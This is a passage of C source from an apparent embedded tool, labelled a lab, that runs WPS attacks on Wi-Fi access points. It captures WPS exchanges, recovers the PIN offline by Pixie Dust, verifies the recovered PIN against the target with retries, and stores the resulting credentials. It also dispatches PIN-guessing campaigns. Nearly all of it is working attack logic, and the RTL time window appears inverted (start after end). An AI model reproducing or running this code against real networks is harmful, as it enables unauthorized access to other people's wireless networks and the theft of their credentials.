        (command->epoch < 1577836800U || command->epoch > 4102444800U ||
         command->epoch < 86400U || command->epoch > UINT32_MAX - 86400U)) {
        *result = "invalid_rtl_epoch";
        *cleanup = "not_required";
        goto done;
    }
    pixie_options_t options = {
        .modes = PIXIE_MODE_NULL_SECRET | PIXIE_MODE_STATIC_SECRET |
                 PIXIE_MODE_RALINK,
        .yield_every = 128U,
        .yield = workflow_yield_callback,
        .should_cancel = workflow_cancel_callback,
        .callback_context = workflows,
        .cache_alloc = pixie_cache_alloc,
        .cache_free = pixie_cache_free,
        .cache_context = workflows->platform,
    };
    if (command->epoch_set) {
        const uint32_t span = 86400U;
        options.modes |= PIXIE_MODE_RTL819X;
        options.rtl_window_set = true;
        options.rtl_window_start = command->epoch + span;
        options.rtl_window_end = command->epoch - span;
    }
    emit_simple_stage(workflows, operation_id, "pixie_capture_start");
    session = workflows->ops->capture_pixie(
        workflows->ops_context, command->bssid, &bundle);
    remember_identity(workflows, &session.result);
    emit_session_stage(workflows, operation_id, "pixie_capture", &session);
    *cleanup = session.cleanup_ok ? "ok" : "failed";
    if (!session.started || !session.cleanup_ok) {
        *result = session.result.cancelled ? "cancelled" : "pixie_capture_failed";
        goto done;
    }
    if (session.result.cancelled) {
        *result = "cancelled";
        goto done;
    }
    if (session.result.session_result != WPS_SESSION_SUCCESS) {
        if (session.result.session_result == WPS_SESSION_SETUP_LOCKED)
            *result = "capture_setup_locked";
        else if (session.result.session_result == WPS_SESSION_TIMEOUT)
            *result = "capture_timeout";
        else if (session.result.session_result == WPS_SESSION_DISCONNECTED)
            *result = "capture_disconnected";
        else if (session.result.session_result == WPS_SESSION_IDENTITY_LOOP)
            *result = "capture_identity_loop";
        else
            *result = "capture_failed";
        goto done;
    }

    /* Wifit3 resets association/transport between attempts but keeps the
     * operation's client MAC. A later operation generates a new random MAC. */
    workflows->reuse_previous_session_mac = true;
    secure_wipe(&session.result, sizeof(session.result));
    search_ok = workflows->ops->recover_pixie(
        workflows->ops_context, &bundle, &options, &found);
    emit_pixie_result(workflows, operation_id, search_ok, &found);
    if (!search_ok) {
        *result = "pixie_search_error";
        goto done;
    }
    if (found.cancelled) {
        lab_secret_erase(vault);
        *result = "cancelled";
        goto done;
    }
    if (!found.found) {
        *result = found.partial ? "partial_match" : "no_match";
        goto done;
    }
    for (unsigned attempt = 1; attempt <= PIXIE_VERIFY_ATTEMPTS; ++attempt) {
        char line[160];
        (void)snprintf(line, sizeof(line),
                       "{\"schema\":1,\"operation_id\":%u,\"type\":\"wps_stage\"," 
                       "\"stage\":\"pixie_verify_attempt\",\"attempt\":%u,\"max\":%u}",
                       (unsigned)operation_id, attempt,
                       (unsigned)PIXIE_VERIFY_ATTEMPTS);
        if (workflows->emit) workflows->emit(workflows->emit_context, line);
        secure_wipe(line, sizeof(line));

        memset(&session, 0, sizeof(session));
        session = workflows->ops->verify_pin(
            workflows->ops_context, command->bssid, found.pin);
        remember_identity(workflows, &session.result);
        emit_session_stage(workflows, operation_id, "pixie_verify", &session);
        *cleanup = session.cleanup_ok ? "ok" : "failed";
        if (!session.started || !session.cleanup_ok) {
            *result = session.result.cancelled ? "cancelled" :
                                                  "verification_session_failed";
            goto done;
        }
        if (session.result.cancelled) {
            lab_secret_erase(vault);
            *result = "cancelled";
            goto done;
        }
        if (session.result.session_result == WPS_SESSION_SUCCESS) {
            bool stored = store_authenticated_secret(
                vault, found.pin, &session.result, operation_id,
                lab_platform_now_ms(workflows->platform));
            *result = stored ? "pixie_pin_and_m7_verified" :
                               "credential_missing";
            if (stored)
                persist_success(workflows, command, found.pin, &session.result,
                                operation_id, "pixie");
            goto done;
        }

        bool retryable = session.result.session_result == WPS_SESSION_TIMEOUT ||
                         session.result.session_result == WPS_SESSION_DISCONNECTED ||
                         session.result.session_result == WPS_SESSION_IDENTITY_LOOP;
        if (retryable && attempt < PIXIE_VERIFY_ATTEMPTS) {
            (void)snprintf(line, sizeof(line),
                           "{\"schema\":1,\"operation_id\":%u,\"type\":\"wps_stage\"," 
                           "\"stage\":\"pixie_verify_retry\",\"next_attempt\":%u," 
                           "\"delay_ms\":1000}",
                           (unsigned)operation_id, attempt + 1U);
            if (workflows->emit) workflows->emit(workflows->emit_context, line);
            secure_wipe(line, sizeof(line));
            secure_wipe(&session.result, sizeof(session.result));
            if (!workflow_retry_delay(workflows, 1000U)) {
                lab_secret_erase(vault);
                *result = "cancelled";
                goto done;
            }
            continue;
        }

        if (session.result.session_result == WPS_SESSION_PIN_REJECTED)
            *result = "recovered_pin_rejected";
        else if (session.result.session_result == WPS_SESSION_SETUP_LOCKED)
            *result = "verification_setup_locked";
        else if (session.result.session_result == WPS_SESSION_TIMEOUT)
            *result = "verification_timeout";
        else if (session.result.session_result == WPS_SESSION_DISCONNECTED)
            *result = "verification_disconnected";
        else if (session.result.session_result == WPS_SESSION_IDENTITY_LOOP)
            *result = "verification_identity_loop";
        else if (session.result.session_result == WPS_SESSION_PRE_PIN_REJECTED)
            *result = "verification_soft_locked";
        else
            *result = "verification_fatal";
        goto done;
    }
done:
    workflows->reuse_previous_session_mac = false;
    secure_wipe(&session.result, sizeof(session.result));
    secure_wipe(&bundle, sizeof(bundle));
    secure_wipe(&found, sizeof(found));
    return true;
}

bool lab_workflows_execute(lab_workflows_t *workflows,
                           const lab_command_t *command,
                           uint32_t operation_id,
                           lab_secret_vault_t *vault,
                           const char **operation_result,
                           const char **cleanup_result)
{
    if (!workflows || !command || !vault || !operation_result ||
        !cleanup_result || !workflows->ops) return false;
    *operation_result = "invalid_workflow_command";
    *cleanup_result = "not_required";
    workflows->attempt_count = 0;
    workflows->candidate_count = 0;
    workflows->resume_index = command->start_index;
    workflows->campaign_progress_valid =
        command->kind == LAB_COMMAND_WPS_CAMPAIGN;
    workflows->storage_result = "not_required";
    memset(&workflows->last_identity, 0, sizeof(workflows->last_identity));

    bool needs_bssid = command->kind == LAB_COMMAND_JWPS_PLAN ||
                       command->kind == LAB_COMMAND_WPS_VERIFY ||
                       command->kind == LAB_COMMAND_WPS_CAMPAIGN ||
                       command->kind == LAB_COMMAND_WPS_PIXIE;
    if (needs_bssid && !explicit_bssid(command->bssid)) {
        *operation_result = "invalid_bssid";
        return true;
    }

    if (command->kind == LAB_COMMAND_JWPS_PLAN) {
        wps_pin_candidate_t *candidates = NULL;
        size_t count = 0;
        if (load_plan(workflows, command, &candidates, &count,
                      operation_result, cleanup_result)) {
            workflows->candidate_count = (unsigned)count;
            *operation_result = "plan_ready";
            secure_wipe(candidates,
                        WPS_PIN_CANDIDATE_MAX * sizeof(*candidates));
            lab_platform_psram_free(workflows->platform, candidates);
        }
        return true;
    }
    bool executed = false;
    if (command->kind == LAB_COMMAND_WPS_VERIFY)
        executed = verified_secret(workflows, command, command->pin,
                                   operation_id, vault, operation_result,
                                   cleanup_result);
    else if (command->kind == LAB_COMMAND_WPS_CAMPAIGN)
        executed = execute_campaign(workflows, command, operation_id, vault,
                                    operation_result, cleanup_result);
    else if (command->kind == LAB_COMMAND_WPS_PIXIE)
        executed = execute_pixie(workflows, command, operation_id, vault,
                                 operation_result, cleanup_result);
    if (command->kind == LAB_COMMAND_WPS_VERIFY ||
        command->kind == LAB_COMMAND_WPS_CAMPAIGN ||
        command->kind == LAB_COMMAND_WPS_PIXIE) {
        bool success_result =
            strcmp(*operation_result, "pin_and_m7_verified") == 0 ||
            strcmp(*operation_result, "pixie_pin_and_m7_verified") == 0;
        bool success = success_result && strcmp(*cleanup_result, "ok") == 0;
        if (!success) persist_observation(workflows, command, *operation_result);
        return executed;
    }
    if (command->kind >= LAB_COMMAND_SELFTEST_DB &&
        command->kind <= LAB_COMMAND_SELFTEST_PIXIE) {
        bool ok = workflows->ops->selftest(workflows->ops_context,
                                           command->kind);
        *operation_result = ok ? "selftest_verified" : "selftest_failed";
        if (command->kind == LAB_COMMAND_SELFTEST_TRANSPORT)
            *cleanup_result = ok ? "ok" : "failed";
        return true;
    }
    return false;
}

unsigned lab_workflows_resume_index(const lab_workflows_t *workflows)
{
    return workflows ? workflows->resume_index : 0;
}

bool lab_workflows_campaign_progress(const lab_workflows_t *workflows,
                                     unsigned *candidate_count,
                                     unsigned *attempt_count,
                                     unsigned *resume_index)
{
    if (!workflows || !workflows->campaign_progress_valid ||
        !candidate_count || !attempt_count || !resume_index) return false;
    *candidate_count = workflows->candidate_count;
    *attempt_count = workflows->attempt_count;
    *resume_index = workflows->resume_index;
    return true;
}

const char *lab_workflows_storage_result(const lab_workflows_t *workflows)
{
    return workflows && workflows->storage_result ? workflows->storage_result :
                                                     "not_required";
}

void lab_workflows_deinit(lab_workflows_t *workflows)
{
    if (workflows) secure_wipe(workflows, sizeof(*workflows));
}
